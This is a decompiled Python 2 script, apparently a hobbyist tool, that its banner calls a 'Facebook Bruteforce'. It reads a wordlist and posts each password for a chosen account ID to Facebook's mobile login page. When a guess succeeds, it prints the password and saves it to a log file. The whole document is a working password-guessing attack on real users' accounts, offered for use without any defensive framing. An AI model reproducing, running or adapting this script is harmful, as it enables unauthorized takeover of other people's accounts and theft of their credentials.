# Embedded file name: brute.py
# Compiled at: 2019-05-26 04:19:45
import os, sys, requests
if sys.platform == 'linux' or sys.platform == 'linux2':
    os.system('clear')
elif sys.platform == 'win32':
    os.system('cls')
banner = "\n\nAuthor : Rizal Hichijou \nName program : Facebook Bruteforce\nVersion : 0.1\nModule : requests\nLog saved in dir 'log'\n[*] Create 'wordlist.txt' before use this tool [*]\n\n\n\n       Copyright - Rizal hichijou\n\n"
print banner

def main():
    try:
        asu = open('log/log.txt', 'a')
        while True:
            cm = raw_input('[*] Input ID : ')
            gu = cm
            if cm == '':
                print '[*] Please Input ID/username [*]'
            else:
                break

        print '[+] Starting BruteForce [+]'
        hola = open('wordlist.txt', 'r').readlines()
        for ju in hola:
            pw = ju.strip()
            try:
                param = {'email': cm, 'pass': pw, 'login': 'submit'}
                site = 'https://free.facebook.com/login.php'
                r = requests.post(site, data=param)
                if 'error' in r.text or 'Login' in r.text or 'Masuk' in r.text:
                    print '[*] Trying : ' + pw + ' [*]'
                else:
                    print '\n[+] ================= [+]'
                    print '[+] Pasword Found [+]'
                    print '[+] ID : ' + cm + ' [+]'
                    print '[+] Pass : ' + pw + ' [+]'
                    print '[+] ================= [+]'
                    asu.write('\n[+] ID : ' + cm + ' \n[+] Pass : ' + pw)
                    asu.close()
                    exit()
            except requests.exceptions.ConnectionError:
                print '[!] Connection Error [!]'
                exit()

    except KeyboardInterrupt:
        print '[!] RunTime Error : Keyboard Interrupt'
        exit()


main()
# okay decompiling brute.pyc
